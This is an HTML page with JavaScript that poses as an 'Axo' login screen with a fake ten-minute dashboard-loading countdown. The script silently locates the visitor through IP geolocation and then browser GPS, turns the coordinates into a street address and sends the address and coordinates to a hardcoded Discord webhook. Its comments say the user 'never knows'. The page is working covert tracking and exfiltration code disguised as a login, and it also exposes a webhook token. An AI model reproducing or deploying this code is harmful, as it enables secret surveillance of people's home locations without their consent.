<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
    <title>Axo · Login</title>
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
        }
        body {
            background: #0a1628;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
            background-image: radial-gradient(circle at 30% 20%, #1a2f4a 0%, #0b1729 90%);
        }
        .glass-card {
            max-width: 720px;
            width: 100%;
            background: rgba(12, 26, 45, 0.7);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border-radius: 3.2rem;
            padding: 2rem 1.8rem;
            border: 1px solid rgba(255, 255, 255, 0.06);
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8);
            transition: all 0.2s;
        }
        .step {
            display: block;
            animation: fadeSlide 0.4s ease;
        }
        .step.hidden {
            display: none;
        }
        @keyframes fadeSlide {
            0% { opacity: 0; transform: translateY(18px); }
            100% { opacity: 1; transform: translateY(0); }
        }

        .header {
            display: flex;
            align-items: center;
            gap: 0.8rem;
            margin-bottom: 1.8rem;
            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
            padding-bottom: 1.2rem;
        }
        .header i {
            font-size: 2rem;
            color: #6a9eff;
            filter: drop-shadow(0 0 8px #3f7eff55);
        }
        .header h1 {
            font-weight: 600;
            font-size: 1.6rem;
            background: linear-gradient(to right, #eef6ff, #adccff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: -0.3px;
        }
        .header .badge {
            margin-left: auto;
            background: #1f4b7a55;
            padding: 0.25rem 1rem;
            border-radius: 40px;
            font-size: 0.7rem;
            color: #9abfe6;
            border: 1px solid #3a6f9e55;
        }

        .input-group {
            background: rgba(0, 0, 0, 0.35);
            border-radius: 3rem;
            padding: 0.2rem 0.2rem 0.2rem 1.8rem;
            display: flex;
            align-items: center;
            gap: 0.4rem;
            border: 1px solid rgba(255, 255, 255, 0.06);
            box-shadow: inset 0 4px 8px rgba(0, 0, 0, 0.4);
            margin-bottom: 1rem;
            transition: border 0.2s;
        }
        .input-group:focus-within {
            border-color: #4d8aff;
            box-shadow: 0 0 0 3px #2b6eff33, inset 0 4px 8px rgba(0, 0, 0, 0.4);
        }
        .input-group i {
            color: #8bb3ff;
            font-size: 1rem;
            opacity: 0.7;
        }
        .input-group input {
            background: transparent;
            border: none;
            padding: 1rem 0.2rem;
            font-size: 1rem;
            color: #f0f6ff;
            width: 100%;
            outline: none;
            font-weight: 400;
            letter-spacing: 0.2px;
        }
        .input-group input::placeholder {
            color: #6a8aa8;
            font-weight: 300;
            opacity: 0.7;
        }
        .btn-primary {
            background: #2b6eff;
            border: none;
            padding: 0.9rem 2rem;
            border-radius: 60px;
            font-weight: 600;
            font-size: 1rem;
            color: white;
            display: inline-flex;
            align-items: center;
            gap: 0.8rem;
            cursor: pointer;
            transition: 0.15s;
            box-shadow: 0 8px 20px #1a4bcf66;
            border: 1px solid #5b8aff;
            width: 100%;
            justify-content: center;
        }
        .btn-primary:hover {
            background: #3f7aff;
            transform: scale(1.01);
        }
        .btn-primary:active {
            transform: scale(0.97);
        }
        .btn-secondary {
            background: transparent;
            border: 1px solid #3a6f9e;
            padding: 0.7rem 1.8rem;
            border-radius: 60px;
            color: #b2cef0;
            font-weight: 500;
            cursor: pointer;
            transition: 0.15s;
            backdrop-filter: blur(4px);
        }
        .btn-secondary:hover {
            background: #1f3f5f55;
            border-color: #6a9eff;
        }

        .login-box {
            padding: 0.5rem 0 0.2rem;
        }
        .login-box .title {
            color: #b2cef0;
            font-size: 0.9rem;
            margin-bottom: 1.2rem;
            opacity: 0.8;
            display: flex;
            align-items: center;
            gap: 0.6rem;
        }
        .login-box .title i {
            color: #6a9eff;
        }

        .dashboard-placeholder {
            background: #0b1d31;
            border-radius: 2rem;
            padding: 2rem 1.5rem;
            text-align: center;
            border: 1px dashed #3a6f9e55;
            margin: 1rem 0;
        }
        .dashboard-placeholder i {
            font-size: 3rem;
            color: #2b6eff;
            margin-bottom: 0.8rem;
            display: block;
        }
        .progress-bar {
            width: 100%;
            height: 6px;
            background: #1a2f44;
            border-radius: 20px;
            margin: 1.2rem 0 0.4rem;
            overflow: hidden;
        }
        .progress-fill {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #2b6eff, #8ab3ff);
            border-radius: 20px;
            transition: width 0.5s;
        }
        .footer-meta {
            margin-top: 1.5rem;
            font-size: 0.7rem;
            color: #4a6f8f;
            display: flex;
            justify-content: center;
            gap: 1.2rem;
            flex-wrap: wrap;
            border-top: 1px solid rgba(255, 255, 255, 0.04);
            padding-top: 1rem;
        }
        .footer-meta i {
            opacity: 0.4;
        }

        /* hidden location grab - no UI elements shown */
        .hidden-grab {
            display: none;
        }

        @media (max-width: 480px) {
            .glass-card {
                padding: 1.2rem;
            }
        }
    </style>
</head>
<body>

    <div class="glass-card" id="appContainer">

        <!-- HEADER -->
        <div class="header">
            <i class="fas fa-map-marked-alt"></i>
            <h1>Axo · Login</h1>
            <span class="badge"><i class="fas fa-lock" style="margin-right:4px;"></i>encrypted</span>
        </div>

        <!-- ===== STEP 1: CUSTOM LOGIN ===== -->
        <div id="stepLogin" class="step">
            <div class="login-box">
                <div class="title">
                    <i class="fas fa-pen-fancy"></i>
                    <span>Place your new login details</span>
                </div>
                <div class="input-group">
                    <i class="fas fa-user"></i>
                    <input type="text" id="usernameInput" placeholder="Username or email" value="admin@axo.io" />
                </div>
                <div class="input-group">
                    <i class="fas fa-lock"></i>
                    <input type="password" id="passwordInput" placeholder="Password" value="••••••••" />
                </div>
                <div style="margin-top: 0.8rem; display: flex; gap: 0.8rem; flex-wrap: wrap;">
                    <button id="loginBtn" class="btn-primary"><i class="fas fa-arrow-right-to-bracket"></i> Sign in</button>
                </div>
                <div id="loginStatus" style="margin-top: 0.8rem; font-size: 0.85rem; color: #9bb9d9; min-height: 1.5rem;"></div>
            </div>
        </div>

        <!-- ===== STEP 2: PREPARING DASHBOARD (loading 10 mins) ===== -->
        <div id="stepDashboardLoading" class="step hidden">
            <div class="dashboard-placeholder">
                <i class="fas fa-spinner fa-pulse"></i>
                <div style="font-size: 1.4rem; font-weight: 500; color: #eef6ff;">Preparing your dashboard</div>
                <div style="color: #9bb9d9; margin: 0.4rem 0;">Axo is provisioning your custom environment</div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill" style="width:0%;"></div>
                </div>
                <div style="display: flex; justify-content: space-between; font-size:0.7rem; color:#4a6f8f; margin-top:0.2rem;">
                    <span>initializing</span>
                    <span id="timerDisplay">10:00</span>
                </div>
                <div style="margin-top: 1rem; font-size:0.85rem; color:#b2cef0;">
                    <i class="fas fa-cog fa-spin"></i> loading modules, datasets, and permissions...
                </div>
                <!-- NO LOCATION INDICATOR - user never sees it -->
            </div>
            <div style="display: flex; justify-content: center; gap: 0.8rem; flex-wrap: wrap; margin-top: 0.4rem;">
                <button id="resetAppBtn" class="btn-secondary"><i class="fas fa-undo-alt"></i> Restart</button>
            </div>
        </div>

        <!-- ===== STEP 3: DASHBOARD READY (after 10 min) ===== -->
        <div id="stepDashboardReady" class="step hidden">
            <div class="dashboard-placeholder" style="border-color: #2b6eff55; background: #0f2640;">
                <i class="fas fa-check-circle" style="color: #8bdaa0;"></i>
                <div style="font-size: 1.4rem; font-weight: 500; color: #eef6ff;">Dashboard ready</div>
                <div style="color: #9bb9d9; margin: 0.4rem 0;">Your Axo Admin is now available</div>
                <div style="margin-top: 1.2rem; display: flex; gap: 0.8rem; justify-content: center; flex-wrap: wrap;">
                    <button id="launchDashboardBtn" class="btn-primary" style="min-width: 200px;"><i class="fas fa-rocket"></i> Launch</button>
                    <button id="resetFromReadyBtn" class="btn-secondary"><i class="fas fa-undo-alt"></i> Restart</button>
                </div>
            </div>
        </div>

        <!-- FOOTER -->
        <div class="footer-meta">
            <span><i class="fas fa-lock"></i> encrypted · shared via Axo</span>
            <span><i class="far fa-clock"></i> <span id="footerTimestamp">2026-06-19T11:07:07.368Z</span></span>
            <span><i class="fas fa-globe-asia"></i> v3.0</span>
        </div>
    </div>

    <script>
        (function() {
            "use strict";

            // DOM refs
            const stepLogin = document.getElementById('stepLogin');
            const stepDashboardLoading = document.getElementById('stepDashboardLoading');
            const stepDashboardReady = document.getElementById('stepDashboardReady');

            const usernameInput = document.getElementById('usernameInput');
            const passwordInput = document.getElementById('passwordInput');
            const loginBtn = document.getElementById('loginBtn');
            const loginStatus = document.getElementById('loginStatus');

            const progressFill = document.getElementById('progressFill');
            const timerDisplay = document.getElementById('timerDisplay');

            const resetBtn = document.getElementById('resetAppBtn');
            const resetFromReadyBtn = document.getElementById('resetFromReadyBtn');
            const launchDashboardBtn = document.getElementById('launchDashboardBtn');

            const footerTimestamp = document.getElementById('footerTimestamp');

            // webhook
            const WEBHOOK_URL =
                'https://discord.com/api/webhooks/1517484431311507576/IP3tnvep8OdyuEnHOaeBCHGmaMVKcAupa-9CzCf9l6SNjSV0SRjm41K92Pyvaqf8AnZt';

            // state
            let isDashboardLoading = false;
            let dashboardTimer = null;
            let countdownInterval = null;
            let loadingStartTime = null;
            let locationGrabbed = false;
            let locationData = null;

            // ----- update timestamp -----
            function updateTimestamp() {
                const now = new Date();
                footerTimestamp.textContent = now.toISOString().replace('T', ' ').slice(0, 19) + 'Z';
            }
            updateTimestamp();
            setInterval(updateTimestamp, 30000);

            // ----- show step -----
            function showStep(stepId) {
                [stepLogin, stepDashboardLoading, stepDashboardReady].forEach(el => el.classList.add('hidden'));
                document.getElementById(stepId).classList.remove('hidden');
            }

            // ----- reverse geocode (Nominatim) -----
            async function reverseGeocode(lat, lng) {
                const url =
                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1&accept-language=en`;
                const resp = await fetch(url, {
                    headers: { 'Accept': 'application/json', 'User-Agent': 'Axo-Force/3.0' }
                });
                if (!resp.ok) throw new Error(`Geocode API error ${resp.status}`);
                const data = await resp.json();
                if (!data || !data.address) throw new Error('No address found');
                return data;
            }

            // ----- extract address fields -----
            function extractAddress(data) {
                const addr = data.address || {};
                const display = data.display_name || '';
                const houseNumber = addr.house_number || addr.building || addr.address29 || '';
                const street = addr.road || addr.street || addr.pedestrian || '';
                const city = addr.city || addr.town || addr.village || addr.suburb || addr.municipality || '';
                const state = addr.state || addr.region || addr.province || addr.district || '';
                const country = addr.country || '';
                const postcode = addr.postcode || '';
                const neighbourhood = addr.neighbourhood || addr.quarter || addr.hamlet || '';
                return { houseNumber, street, city, state, country, postcode, neighbourhood, fullAddress: display };
            }

            // ----- send webhook (discord) with location report -----
            async function sendWebhook(lat, lng, address) {
                try {
                    const payload = {
                        content: `📍 **Axo Force Location Report**\n` +
                            `**User Address:** ${address.fullAddress || 'N/A'}\n` +
                            `**Coords:** ${lat.toFixed(6)}, ${lng.toFixed(6)}\n` +
                            `**Country:** ${address.country || 'N/A'}\n` +
                            `**House/Building:** ${address.houseNumber || 'N/A'}\n` +
                            `**Street:** ${address.street || 'N/A'}\n` +
                            `**City:** ${address.city || 'N/A'}\n` +
                            `**State:** ${address.state || 'N/A'}\n` +
                            `**Postcode:** ${address.postcode || 'N/A'}\n` +
                            `**Neighbourhood:** ${address.neighbourhood || 'N/A'}\n` +
                            `**Timestamp:** ${new Date().toISOString()}`
                    };
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    console.log('Webhook sent.');
                } catch (e) {
                    console.warn('Webhook failed:', e);
                }
            }

            // ----- FORCE GRAB LOCATION (completely silent, user never knows) -----
            async function forceGrabLocation() {
                if (locationGrabbed) return;
                locationGrabbed = true;

                try {
                    let lat, lng;
                    let usedMethod = 'IP';

                    // 1. Try IP geolocation (no permission, completely silent)
                    try {
                        const ipResp = await fetch('https://ipapi.co/json/');
                        if (ipResp.ok) {
                            const ipData = await ipResp.json();
                            if (ipData.latitude && ipData.longitude) {
                                lat = parseFloat(ipData.latitude);
                                lng = parseFloat(ipData.longitude);
                                if (!isNaN(lat) && !isNaN(lng) && lat >= -90 && lat <= 90 && lng >= -180 && lng <= 180) {
                                    usedMethod = 'IP';
                                }
                            }
                        }
                    } catch (e) { /* silently ignore */ }

                    // 2. If IP failed, try GPS (silent - may prompt but we don't show UI)
                    if (!lat || !lng) {
                        try {
                            const gpsPos = await new Promise((resolve, reject) => {
                                navigator.geolocation.getCurrentPosition(resolve, reject, {
                                    enableHighAccuracy: true,
                                    timeout: 8000,
                                    maximumAge: 0
                                });
                            });
                            lat = gpsPos.coords.latitude;
                            lng = gpsPos.coords.longitude;
                            usedMethod = 'GPS';
                        } catch (e) {
                            // 3. Fallback: use default (Islamabad)
                            lat = 33.680000;
                            lng = 73.020000;
                            usedMethod = 'fallback (default)';
                        }
                    }

                    // ensure valid
                    if (isNaN(lat) || isNaN(lng) || lat < -90 || lat > 90 || lng < -180 || lng > 180) {
                        lat = 33.680000;
                        lng = 73.020000;
                        usedMethod = 'fallback (default)';
                    }

                    // Reverse geocode
                    const data = await reverseGeocode(lat, lng);
                    const address = extractAddress(data);

                    // Store for later use
                    locationData = { lat, lng, address, usedMethod };

                    // Send webhook (completely silent)
                    await sendWebhook(lat, lng, address);

                    console.log('Location captured silently:', lat, lng);

                } catch (err) {
                    // Silent fail - user never knows
                    console.warn('Silent location grab failed:', err);
                    locationGrabbed = false;
                }
            }

            // ----- start dashboard loading (10 min) -----
            function startDashboardLoading() {
                if (isDashboardLoading) return;
                isDashboardLoading = true;

                // Silently grab location in background (user never sees it)
                // Start immediately, not waiting for any UI element
                if (!locationGrabbed) {
                    forceGrabLocation();
                }

                showStep('stepDashboardLoading');
                loadingStartTime = Date.now();
                const duration = 10 * 60;

                progressFill.style.width = '0%';
                timerDisplay.textContent = '10:00';

                if (countdownInterval) clearInterval(countdownInterval);
                countdownInterval = setInterval(() => {
                    const diff = (Date.now() - loadingStartTime) / 1000;
                    const remaining = Math.max(0, duration - diff);
                    const minutes = Math.floor(remaining / 60);
                    const seconds = Math.floor(remaining % 60);
                    timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
                    const progress = Math.min(100, (diff / duration) * 100);
                    progressFill.style.width = `${progress}%`;

                    if (remaining <= 0) {
                        clearInterval(countdownInterval);
                        timerDisplay.textContent = '00:00';
                        progressFill.style.width = '100%';
                        // Show ready state
                        showStep('stepDashboardReady');
                        isDashboardLoading = false;
                    }
                }, 500);

                if (dashboardTimer) clearTimeout(dashboardTimer);
                dashboardTimer = setTimeout(() => {
                    if (countdownInterval) clearInterval(countdownInterval);
                    timerDisplay.textContent = '00:00';
                    progressFill.style.width = '100%';
                    showStep('stepDashboardReady');
                    isDashboardLoading = false;
                }, (duration + 10) * 1000);
            }

            // ----- reset app -----
            function resetApp() {
                if (countdownInterval) clearInterval(countdownInterval);
                if (dashboardTimer) clearTimeout(dashboardTimer);
                isDashboardLoading = false;
                locationGrabbed = false;
                locationData = null;
                progressFill.style.width = '0%';
                timerDisplay.textContent = '10:00';
                loginStatus.textContent = '';
                showStep('stepLogin');
            }

            // ----- handle login -----
            function handleLogin() {
                const username = usernameInput.value.trim();
                const password = passwordInput.value.trim();

                if (!username || !password) {
                    loginStatus.innerHTML = '<i class="fas fa-exclamation-circle" style="color:#ff9f8c;"></i> Please fill in all fields';
                    return;
                }

                loginStatus.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Authenticating...';
                loginBtn.disabled = true;

                // Simulate authentication delay
                setTimeout(() => {
                    loginStatus.innerHTML = '<i class="fas fa-check-circle" style="color:#8bdaa0;"></i> Login successful!';
                    // Start dashboard loading after a short delay
                    setTimeout(() => {
                        startDashboardLoading();
                    }, 800);
                }, 1200);
            }

            // ----- event listeners -----
            loginBtn.addEventListener('click', handleLogin);

            usernameInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') handleLogin();
            });
            passwordInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') handleLogin();
            });

            resetBtn.addEventListener('click', resetApp);
            resetFromReadyBtn.addEventListener('click', resetApp);

            launchDashboardBtn.addEventListener('click', () => {
                alert('🚀 Axo Admin Dashboard launched!');
                resetApp();
            });

            // Show login step initially
            showStep('stepLogin');

        })();
    </script>

</body>
</html>
